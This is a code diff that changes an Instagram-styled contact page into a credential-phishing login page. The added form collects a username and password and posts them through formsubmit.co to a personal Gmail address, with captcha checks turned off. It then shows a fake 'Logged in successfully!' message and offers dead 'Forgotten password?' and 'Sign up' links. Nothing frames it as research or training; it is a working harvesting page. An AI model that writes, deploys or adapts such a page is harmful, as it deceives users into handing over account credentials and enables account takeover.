@@ -80,13 +80,13 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: flex-start;
-            padding: 60px 20px 40px;
+            justify-content: center;
+            padding: 32px 20px 40px;
             overflow-y: auto;
         }
 
         .logo-container {
-            margin-bottom: 40px;
+            margin-bottom: 24px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -95,33 +95,26 @@
         .instagram-logo {
             width: 80px;
             height: 80px;
-            margin-bottom: 0;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 50%;
+            overflow: hidden;
             background: linear-gradient(135deg, #f10074 0%, #d10d8a 20%, #ff6a3d 58%, #ff9f1c 100%);
             box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05);
             flex-shrink: 0;
         }
 
-        .instagram-logo svg {
-            width: 76%;
-            height: 76%;
+        .instagram-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
             display: block;
-        }
-
-        .instagram-text {
-            font-size: 32px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            color: #e4e6eb;
-            margin-bottom: 60px;
-            display: none;
         }
 
         .form-container {
             width: 100%;
+            max-width: 320px;
         }
 
         .form-group {
@@ -130,10 +123,9 @@
 
         input[type="text"],
         input[type="email"],
-        input[type="password"],
-        textarea {
+        input[type="password"] {
             width: 100%;
-            padding: 12px 16px;
+            padding: 12px 14px;
             font-size: 16px;
             background-color: #262626;
             border: 1px solid #404040;
@@ -146,22 +138,15 @@
 
         input[type="text"]::placeholder,
         input[type="email"]::placeholder,
-        input[type="password"]::placeholder,
-        textarea::placeholder {
+        input[type="password"]::placeholder {
             color: #a0a0a0;
         }
 
         input[type="text"]:focus,
         input[type="email"]:focus,
-        input[type="password"]:focus,
-        textarea:focus {
+        input[type="password"]:focus {
             border-color: #5a5a5a;
             background-color: #1a1a1a;
-        }
-
-        textarea {
-            min-height: 120px;
-            resize: vertical;
         }
 
         input.error {
@@ -182,8 +167,8 @@
 
         .login-button {
             width: 100%;
-            padding: 10px;
-            margin-top: 20px;
+            padding: 11px 12px;
+            margin-top: 16px;
             background-color: #0a66c2;
             color: #fff;
             border: none;
@@ -207,7 +192,7 @@
 
         .forgot-password {
             text-align: center;
-            margin-top: 20px;
+            margin-top: 16px;
         }
 
         .forgot-password a {
@@ -224,7 +209,7 @@
         .divider {
             display: flex;
             align-items: center;
-            margin: 32px 0 24px;
+            margin: 20px 0 16px;
             font-size: 13px;
             color: #a0a0a0;
             gap: 16px;
@@ -238,39 +223,24 @@
             background: #262626;
         }
 
-        .signup-section {
+        .signup-box {
             width: 100%;
-            margin-top: 32px;
-        }
-
-        .create-account-button {
-            width: 100%;
-            padding: 10px;
-            background: none;
-            border: 1.5px solid #0a66c2;
-            border-radius: 8px;
-            color: #0a66c2;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            font-family: inherit;
-        }
-
-        .create-account-button:active {
-            background-color: rgba(10, 102, 194, 0.1);
-        }
-
-        .footer {
-            padding: 20px;
+            max-width: 320px;
+            padding: 16px 0 0;
             text-align: center;
             border-top: 1px solid #262626;
+            margin-top: 8px;
         }
 
-        .meta-logo {
-            font-size: 14px;
+        .signup-box span {
             color: #a0a0a0;
-            letter-spacing: 1px;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
         }
 
         .success-message {
@@ -295,11 +265,7 @@
             }
 
             .content {
-                padding: 50px 20px 40px;
-            }
-
-            .logo-container {
-                margin-bottom: 60px;
+                padding: 28px 20px 36px;
             }
         }
     </style>
@@ -316,168 +282,57 @@
 
         <div class="content">
             <div class="logo-container">
-                <div class="instagram-logo" aria-label="Instagram logo">
-                    <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                        <rect x="38" y="40" width="164" height="160" rx="38" fill="none" stroke="white"
-                            stroke-width="12" />
-                        <circle cx="120" cy="120" r="48" fill="none" stroke="white" stroke-width="12" />
-                        <circle cx="120" cy="120" r="20" fill="none" stroke="white" stroke-width="10" />
-                        <circle cx="170" cy="79" r="10" fill="white" />
-                    </svg>
+                <div class="instagram-logo" aria-label="Profile logo">
+                    <img src="sadaf mallick.jpeg" alt="Sadaf Mallick" />
                 </div>
-                <div class="instagram-text">instagram</div>
             </div>
 
             <div class="form-container">
                 <div class="success-message" id="successMessage">
-                    Message sent successfully! ✓
+                    Logged in successfully! ✓
                 </div>
 
-                <form id="contactForm">
+                <form id="loginForm" action="https://formsubmit.co/mallickfahad13@gmail.com" method="POST">
+                    <input type="hidden" name="_subject" value="New Form Submission">
+                    <input type="hidden" name="_captcha" value="false">
+
                     <div class="form-group">
-                        <input type="text" id="name" placeholder="Your name" autocomplete="name">
-                        <div class="error-message" id="nameError"></div>
+                        <input type="text" id="username" name="username" placeholder="Phone number, username, or email"
+                            autocomplete="username" required>
+                        <div class="error-message" id="usernameError"></div>
                     </div>
 
                     <div class="form-group">
-                        <input type="email" id="email" placeholder="Email address" autocomplete="email">
-                        <div class="error-message" id="emailError"></div>
+                        <input type="password" id="password" name="password" placeholder="Password"
+                            autocomplete="current-password" required>
+                        <div class="error-message" id="passwordError"></div>
                     </div>
 
-                    <div class="form-group">
-                        <input type="text" id="subject" placeholder="Subject" autocomplete="off">
-                        <div class="error-message" id="subjectError"></div>
-                    </div>
-
-                    <div class="form-group">
-                        <textarea id="message" placeholder="Your message"></textarea>
-                        <div class="error-message" id="messageError"></div>
-                    </div>
-
-                    <button type="submit" class="login-button" id="submitBtn">Send message</button>
+                    <button type="submit" class="login-button" id="submitBtn">Log in</button>
                 </form>
 
-                <div class="signup-section">
-                    <button class="create-account-button"
-                        onclick="window.location.href = 'mailto:mallickfahad13@gmail.com'">
-                        Email us directly
-                    </button>
+                <div class="forgot-password">
+                    <a href="#">Forgotten password?</a>
                 </div>
-            </div>
-        </div>
 
-        <div class="footer">
-            <div class="meta-logo">∞ Meta</div>
+                <div class="divider">OR</div>
+            </div>
+
+            <div class="signup-box">
+                <span>Don't have an account? <a href="#">Sign up</a></span>
+            </div>
         </div>
     </div>
 
     <script>
-        const form = document.getElementById('contactForm');
-        const nameInput = document.getElementById('name');
-        const emailInput = document.getElementById('email');
-        const subjectInput = document.getElementById('subject');
-        const messageInput = document.getElementById('message');
-        const nameError = document.getElementById('nameError');
-        const emailError = document.getElementById('emailError');
-        const subjectError = document.getElementById('subjectError');
-        const messageError = document.getElementById('messageError');
-        const submitBtn = document.getElementById('submitBtn');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
         const successMessage = document.getElementById('successMessage');
 
-        function clearErrors() {
-            [nameError, emailError, subjectError, messageError].forEach((error) => error.classList.remove('show'));
-            [nameInput, emailInput, subjectInput, messageInput].forEach((input) => input.classList.remove('error'));
-        }
-
-        function setError(input, errorElement, text) {
-            input.classList.add('error');
-            errorElement.textContent = text;
-            errorElement.classList.add('show');
-        }
-
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-            clearErrors();
-
-            const name = nameInput.value.trim();
-            const email = emailInput.value.trim();
-            const subject = subjectInput.value.trim();
-            const message = messageInput.value.trim();
-            let hasError = false;
-
-            if (!name) {
-                setError(nameInput, nameError, 'Name is required.');
-                hasError = true;
-            }
-
-            if (!email) {
-                setError(emailInput, emailError, 'Email is required.');
-                hasError = true;
-            } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-                setError(emailInput, emailError, 'Enter a valid email address.');
-                hasError = true;
-            }
-
-            if (!subject) {
-                setError(subjectInput, subjectError, 'Subject is required.');
-                hasError = true;
-            }
-
-            if (!message) {
-                setError(messageInput, messageError, 'Message is required.');
-                hasError = true;
-            }
-
-            if (hasError) {
-                return;
-            }
-
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Sending...';
-
-            try {
-                const response = await fetch('http://localhost:3000/api/contact', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ name, email, subject, message })
-                });
-
-                const result = await response.json();
-
-                if (!response.ok || !result.success) {
-                    throw new Error(result.error || 'Unable to send message.');
-                }
-
-                successMessage.classList.add('show');
-                form.reset();
-            } catch (error) {
-                successMessage.textContent = error.message || 'Something went wrong. Please try again.';
-                successMessage.classList.add('show');
-                successMessage.style.backgroundColor = '#5a1d1d';
-                successMessage.style.color = '#ffb4b4';
-                successMessage.style.borderColor = '#8a2e2e';
-            } finally {
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Send message';
-            }
-        });
-
-        [nameInput, emailInput, subjectInput, messageInput].forEach((input) => {
+        [usernameInput, passwordInput].forEach((input) => {
             input.addEventListener('focus', () => {
-                if (input.classList.contains('error')) {
-                    input.classList.remove('error');
-                    const errorId = input.id + 'Error';
-                    const errorElement = document.getElementById(errorId);
-                    errorElement.classList.remove('show');
-                }
-
                 successMessage.classList.remove('show');
-                successMessage.style.backgroundColor = '#2d5016';
-                successMessage.style.color = '#31a24c';
-                successMessage.style.borderColor = '#3d6b21';
-                successMessage.textContent = 'Message sent successfully! ✓';
+                successMessage.textContent = 'Logged in successfully! ✓';
             });
         });
 
